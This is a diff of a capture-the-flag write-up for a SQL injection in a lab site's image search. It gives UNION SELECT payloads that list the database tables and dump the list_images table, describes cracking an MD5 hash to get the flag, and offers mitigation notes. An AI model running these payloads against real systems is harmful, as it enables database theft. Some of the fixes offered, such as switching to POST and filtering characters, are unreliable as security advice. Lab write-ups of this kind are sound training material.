@@ -2,12 +2,12 @@
 
 The image search is vulnerable to sql injections
 
-# The approach
+## The approach
 
-1.Go to http://192.168.101.204/?page=searching
-2.On the search field, type `1 AND 1=1`and press search button 
+-Go to http://192.168.101.204/?page=searching
 
-# The Exploit #
+-On the search field, type `1 AND 1=1`and press search button 
+
 - Type this union command on the filed: -1 union select null, concat (table_name) from information_schema.tables where table_schema = database (). this returns table name which is list_images.
 
 - type on the field -1 union select NULL, concat (id, url, title, comment) from list_images. this returns  images from the table.
@@ -16,13 +16,17 @@ The image search is vulnerable to sql injections
 
 - copy this 1928e8083cf461a51303633093573c46 to a md5 decoder then get the albatroz result to sha256 to get the flag.
 
+## The Exploit #
+
+Users can exploit and destroy sensitive information on your database
 
 ## The solution
+
 - Use prepared statements in the backend to prevent sql injections 
 - Send form as post request
 - try and catch methods should prevent charecters like (', <, ", ?) images shouldnt begin with that type of name.
 
-### Resources
+## Resources
 
 https://www.md5online.org/md5-decrypt.html  
 sha256-hash-generator/ 
